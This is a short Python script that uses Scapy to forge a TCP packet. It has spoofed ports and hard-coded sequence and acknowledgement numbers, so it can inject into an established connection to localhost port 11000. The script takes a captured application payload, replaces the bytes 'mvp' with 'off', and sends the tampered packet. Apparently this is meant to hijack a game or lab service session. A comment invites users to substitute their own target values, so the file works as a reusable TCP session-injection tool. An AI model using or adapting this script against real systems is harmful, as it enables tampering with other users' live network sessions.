from scapy.all import *
from scapy.layers.inet import IP, TCP

# Replace with your specific values
source_ip = "127.0.0.1"
target_ip = "127.0.0.1"
source_port = 52088
target_port = 11000
seq_num = 1323065735
ack_num = 990383748


# Convert the hex payload to bytes
hex_payload = "010500f26781690105535441434b0009a87265736f206d7670"
payload_data = bytes.fromhex(hex_payload)
print(payload_data)
modified_payload = payload_data.replace(b"mvp",b"off")
print(modified_payload)
# Construct the packet
packet = IP(src=source_ip, dst=target_ip) / \
         TCP(sport=source_port, dport=target_port, flags="PA", seq=seq_num, ack=ack_num) / \
         modified_payload

print(packet)
# Send the packet
send(packet)
